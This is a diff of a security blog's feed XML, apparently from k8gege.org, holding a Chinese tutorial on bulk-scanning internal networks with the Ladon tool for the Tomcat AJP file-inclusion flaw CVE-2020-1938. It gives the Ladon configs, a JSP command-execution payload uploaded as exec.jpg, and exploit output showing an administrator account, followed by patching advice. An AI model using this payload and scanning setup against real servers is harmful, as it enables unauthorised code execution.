title="3、配置ajp配置"></a>3、配置ajp配置</h4><p>配置ajp配置中的secretRequired跟secret属性来限制认证</p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h3&gt;&lt;p&gt;根据国家信息安全漏洞共享平台（CNVD）20日发布的Apache Tomcat文件包含漏洞（CNVD-2020-10487/
-      
-    
-    </summary>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
-    
-      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
-    
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
-  </entry>
-  
-  <entry>
     <title>看我如何模拟Cobalt Strike上线欺骗入侵者</title>
     <link href="http://k8gege.org/p/40523.html"/>
     <id>http://k8gege.org/p/40523.html</id>
@@ -419,6 +391,34 @@
       <category term="Cobalt Strike" scheme="http://k8gege.org/tags/Cobalt-Strike/"/>
     
       <category term="Python" scheme="http://k8gege.org/tags/Python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Ladon CVE-2020-1938跨网段、C段批量扫描内网漏洞</title>
+    <link href="http://k8gege.org/p/42879.html"/>
+    <id>http://k8gege.org/p/42879.html</id>
+    <published>2020-03-28T03:39:45.663Z</published>
+    <updated>2020-03-30T03:04:56.043Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>根据国家信息安全漏洞共享平台（CNVD）20日发布的Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。</p><h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><p>cnvd-2020-10487<br>cve-2020-1938</p><h3 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h3><p>开放AJP端口（默认开放8009）</p><h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>apache tomcat 6<br>apache tomcat 7 &lt; 7.0.100<br>apache tomcat 8 &lt; 8.5.51<br>apache tomcat 9 &lt; 9.0.31</p><h3 id="扫描框架"><a href="#扫描框架" class="headerlink" title="扫描框架"></a>扫描框架</h3><p>Ladon设计的初衷就是一个多线程扫描框架，主要是为了让使用者能快速批量检测企业内部或外部站点漏洞<br>不管你擅长哪一门语言，只需要实现单一功能，都可以快速进行批量IP、批量URL、批量C段、批量B段等等<br>每当公开或泄露一个新漏洞时，自己要实现多现程以及批量以上功能，重写一份浪费时间，可能会错过时机<br>小内网可能自己写个批量IP.TXT就够用了，但是大的内网几百几千个网段就基本没有工具考虑，如批量C段<br>但是不要慌，无论是多线程，还是批量C段、跨网段等等，Ladon全都帮你考虑好了，只需实现单一功能即可<br>在Ladon的插件中配置INI方式是不需要具备编程能力的，只要会使用工具，即可实现批量调用，非常简单</p><h3 id="Ladon配置"><a href="#Ladon配置" class="headerlink" title="Ladon配置"></a>Ladon配置</h3><p>INI配置很简单，只需要两个参数即可。Github上随便找一份EXP，以下我用的是PYTHON版。<br>两种配置方式，一种是编译成EXE丢到目标上运行的，一种是PY脚本方式执行方便本地调式</p><h4 id="EXE配置"><a href="#EXE配置" class="headerlink" title="EXE配置"></a>EXE配置</h4><p>cve-2020-1938.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=CVE-2020-1938.exe</span><br><span class="line">arg=-p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure><h4 id="PY配置"><a href="#PY配置" class="headerlink" title="PY配置"></a>PY配置</h4><p>cve-2020-1938.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=f:\python\python.exe</span><br><span class="line">arg=CVE-2020-1938.py -p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure><h3 id="批量内网"><a href="#批量内网" class="headerlink" title="批量内网"></a>批量内网</h3><p>把开放8009端口的IP放进ip.txt，执行以下命令即可批量扫描<br>当然也可以不扫端口和不扫存活IP，直接ip24.txt扫描批量C段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon cve-2020-1938.ini</span><br></pre></td></tr></table></figure><p>以下为内网实战批量检测结果<br><img alt="img" data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2020-1938.png"></p><h3 id="文件包含RCE"><a href="#文件包含RCE" class="headerlink" title="文件包含RCE"></a>文件包含RCE</h3><p>一定条件下可实现RCE，如有地方实现文件上传，往目标传个exec.jpg,内容如下，执行whoami</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%out.println(<span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(<span class="string">"whoami"</span>).getInputStream())).readLine());%&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2020-1938.py -p 8009 -f exec.jpg 192.168.1.10 -c 1</span><br><span class="line">Getting resource at ajp13://192.168.1.10:8009/index.jsp</span><br><span class="line">----------------------------</span><br><span class="line">k82003-77562e10\administrator</span><br></pre></td></tr></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="1-更新到安全版本"><a href="#1-更新到安全版本" class="headerlink" title="1.更新到安全版本"></a>1.更新到安全版本</h4><p>Apache Tomcat 7.0.100<br>Apache Tomcat 8.5.51<br>Apache Tomcat 9.0.31</p><h4 id="2-关闭AJP服务"><a href="#2-关闭AJP服务" class="headerlink" title="2.关闭AJP服务"></a>2.关闭AJP服务</h4><p>修改Tomcat配置文件Service.xml,注释掉<br><connector port="8009" protocol="AJP/1.3" redirectport="8443"></connector></p><h4 id="3、配置ajp配置"><a href="#3、配置ajp配置" class="headerlink" title="3、配置ajp配置"></a>3、配置ajp配置</h4><p>配置ajp配置中的secretRequired跟secret属性来限制认证</p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h3&gt;&lt;p&gt;根据国家信息安全漏洞共享平台（CNVD）20日发布的Apache Tomcat文件包含漏洞（CNVD-2020-10487/
+      
+    
+    </summary>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
+    
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
     
   </entry>
   
@@ -584,13 +584,13 @@
       <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
     
     
-      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
-    
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
       <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
     
+      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
+    
       <category term="GetShell" scheme="http://k8gege.org/tags/GetShell/"/>
+    
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
     
       <category term="ActiveMQ" scheme="http://k8gege.org/tags/ActiveMQ/"/>
     
@@ -625,13 +625,13 @@
       <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
     
     
-      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
-    
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
       <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
     
+      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
+    
       <category term="GetShell" scheme="http://k8gege.org/tags/GetShell/"/>
+    
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
     
       <category term="ThinkPHP" scheme="http://k8gege.org/tags/ThinkPHP/"/>
     
@@ -664,13 +664,13 @@
       <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
     
     
-      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
-    
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
       <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
     
+      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
+    
       <category term="GetShell" scheme="http://k8gege.org/tags/GetShell/"/>
+    
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
     
       <category term="PhpStudy" scheme="http://k8gege.org/tags/PhpStudy/"/>
     
@@ -703,13 +703,13 @@
       <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
     
     
-      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
-    
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
       <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
     
+      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
+    
       <category term="GetShell" scheme="http://k8gege.org/tags/GetShell/"/>
+    
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
     
       <category term="PhpStudy" scheme="http://k8gege.org/tags/PhpStudy/"/>
     
